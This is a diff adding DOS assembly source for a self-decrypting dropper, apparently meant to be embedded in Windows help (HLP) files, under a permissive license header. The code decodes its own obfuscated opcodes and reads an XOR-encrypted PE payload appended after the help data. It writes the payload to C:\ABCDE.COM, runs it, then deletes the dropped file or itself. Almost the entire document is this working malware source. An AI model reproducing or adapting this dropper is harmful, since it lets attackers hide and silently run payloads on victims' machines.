@@ -1,0 +1,220 @@
+   ;COMMENT /
+   ;  (C) VBA Ltd. ALL RIGHTS RESERVED.
+   ;  E-mail: support@vba.com.by
+   ;
+   ;  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.
+   ;
+   ;  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT
+   ;  MODIFICATION, ARE PERMITTED.
+   ;
+   ;  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND
+   ;  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+   ;  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+   ;  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+   ;  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+   ;  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+   ;  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+   ;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+   ;  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+   ;  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+   ;  SUCH DAMAGE.
+   ;/
+
+   ; REQUIRES:
+   ; TASM.EXE -M DOSDROP.ASI
+   ; TLINK.EXE -T DOSDROP.OBJ
+
+   OPEN_ACCESS_READONLY    =   0
+   OPEN_ACCESS_WRITEONLY   =   1
+   OPEN_ACCESS_RO_NOMODLASTACCESS = 4
+   OPEN_SHARE_DENYREADWRITE =  10H
+   OPEN_SHARE_DENYWRITE    =   20H
+   OPEN_FLAGS_NOCRITERR    =   2000H
+   OPEN_FLAGS_COMMIT   =   4000H
+   FILE_OPEN       =   1
+   FILE_CREATE     =   10H
+   FILE_TRUNCATE       =   2
+
+   MODEL TINY
+   P386
+   CODESEG
+   STARTUPCODE
+
+   ;ALGORITHM:
+   ;32H -> ('A'+02H)+('A'+03H)='CD' (IF 'AA' IS MASK)
+
+           POP AX
+           SUB AL,53H
+           PUSH    AX
+           POP SI
+           PUSH    21H
+           POP BX
+           PUSH    4051H
+           POP AX
+           SUB [BX+SI+START_PATCH],AL  ;DECRYPT "BAD"-OPCODES
+           SUB [BX+SI+START_PATCH+1],AL
+           XOR [BX+SI+START_PATCH+2],AL
+           SUB [BX+SI+START_PATCH+1+3],AL
+           SUB [BX+SI+START_PATCH+1+3+3],AL
+           SUB [BX+SI+START_PATCH+1+3+3+3],AL
+           SUB [BX+SI+START_PATCH+1+3+3+3],AL
+           SUB [BX+SI+START_PATCH+1+3+3+3+3+1+1+1+1],AL
+           PUSH    AX
+           POP DI
+           SUB AL,31H
+           INSB                ;RESET CPU CACHE: PORT 20H READ
+                           ;BECAUSE IT'S HOOKED BY VPIC VXD
+           PUSH    44H
+           POP AX
+           XOR AL,40H
+           PUSH    AX
+           POP CX
+
+           PUSH    4040H           ;MASK FOR DECODING
+   UUD_MASK    =   2 PTR $-2
+
+           POP AX
+
+           PUSH    SI
+           POP DI
+
+   GET_WORD:   SUB [BX+SI+OFF_CODE],AX
+
+   START_PATCH =   $-@STARTUP+1+32H
+
+   ;       JB  GET_NEXT
+           DB  72H,0DH+51H
+
+   ;       SHL 1 PTR [BX+SI+40H+1],CL
+           DB  (0D2H+51H) AND 0FFH,60H XOR 51H
+           DB  OFF_CODE+1
+
+   ;       ROL 2 PTR [BX+SI+40H],CL
+           DB  (0D3H+51H) AND 0FFH,40H
+           DB  OFF_CODE
+   ;       PUSH    2 PTR [BX+SI+40H]
+           DB  (0FFH+51H) AND 0FFH,70H
+           DB  OFF_CODE
+   ;       POP 2 PTR [BX+DI+40H]
+           DB  (8FH+51H+51H) AND 0FFH,41H
+           DB  OFF_CODE
+
+           INC DI
+   GET_NEXT:   INC SI
+           INC SI
+   ;       JNS GET_WORD
+           DB  79H,(0EAH+51H) AND 0FFH
+
+   OFF_CODE    =   $-@STARTUP+32H
+
+           MOV SI,80H
+           LODSB
+           CBW
+           XCHG    AX,BX
+           MOV [BX+SI],BH
+   SCAN_CMD:   LODSB
+           CMP AL,20H
+           JE  SCAN_CMD
+           DEC SI
+
+   ;1. OPEN HLP
+           MOV BX,OPEN_FLAGS_NOCRITERR OR OPEN_SHARE_DENYWRITE OR \
+               OPEN_ACCESS_RO_NOMODLASTACCESS OR OPEN_ACCESS_READONLY
+           MOV DX,FILE_OPEN
+           CALL    OPEN_CREATE     ;OPEN HLP FILE
+
+   ;2. SEEK TO END HLP-MODULE
+           MOV CL,10H          ;ASSUME THAT CH=0
+           CALL    READ
+           MOV DX,[SI+HLP_LENGTH]  ;ENTIRE HLP LENGTH
+           MOV CX,[SI+HLP_LENGTH+2]
+           MOV AX,4200H
+           PUSH    AX
+           INT 21H
+
+   ;3. READ AND DECRYPT A MAIN DROPPER
+           POP CX
+           CALL    READ
+           PUSH    AX
+           XCHG    AX,CX
+           MOV DI,DX
+           MOV AX,1234H
+   FIRST_MASK  =   2 PTR $-2
+
+   DECRYPT_DROP:   XOR [DI],AX
+           ADD AX,1234H
+   SECOND_MASK =   2 PTR $-2
+
+           INC DI
+           LOOP    DECRYPT_DROP
+
+           MOV AH,3EH
+           INT 21H
+
+   ;4. CREATE A MAIN DROPPER FILE
+           MOV BX,OPEN_FLAGS_COMMIT OR OPEN_FLAGS_NOCRITERR OR \
+               OPEN_SHARE_DENYREADWRITE OR OPEN_ACCESS_WRITEONLY
+           MOV DX,FILE_CREATE OR FILE_TRUNCATE
+           CALL    OPEN_CREATE
+           POP CX
+           MOV AH,40H
+           CALL    WRITE           ;WRITE PE-DROPPER
+           MOV AH,3EH
+           INT 21H
+
+   ;5. EXEC A MAIN DROPPER FILE
+           LEA SP,_STACK
+           MOV BL,CONSTACK     ;ASSUMES THAT BH=0
+           MOV AH,4AH
+           INT 21H         ;REALLOCATE MEMORY
+           LEA BX,EPB
+           MOV [BX.SEG_1],CS
+           MOV [BX.SEG_2],CS
+           MOV [BX.SEG_3],CS
+           MOV AX,4B00H
+           PUSH    SI
+           CALL    RUN_ME          ;EXECUTE A MAIN DROPPER
+           PUSH    CS
+           POP SS
+           LEA SP,_STACK-2
+           PUSH    CS
+           POP DS SI
+
+   ;6. DELETE A MAIN DROPPER (OR MYSELF)
+   KILL_DROP:  PUSH    0
+           MOV AH,41H
+   RUN_ME:     MOV DX,SI
+   MAKE_INT:   INT 21H         ;DELETE FILE
+           RETN
+
+   READ:       MOV AH,3FH
+   WRITE:      LEA DX,BUFFER
+           JMP MAKE_INT
+
+   OPEN_CREATE:    STC
+           MOV AX,716CH
+           INT 21H
+           LEA SI,FILE_NAME
+           JC  KILL_DROP
+           XCHG    AX,BX
+           RETN
+
+   FILE_NAME   DB  'C:\ABCDE.COM'
+   _EPB        STRUC
+   ENVIR       DW  0
+   CMD_TAIL    DW  80H
+   SEG_1       DW  ?
+   FCB_1       DW  5CH
+   SEG_2       DW  ?
+   FCB_2       DW  6CH
+   SEG_3       DW  ?
+           ENDS
+   EPB     _EPB    <>
+   BUFFER      DB  0CH DUP (?)
+   HLP_LENGTH  =   $-FILE_NAME
+           DW  ?
+           DW  ?
+           DB  200H DUP (?)
+   CONSTACK    =   ($-@STARTUP+100H)/10H+1
+   _STACK:
+           END
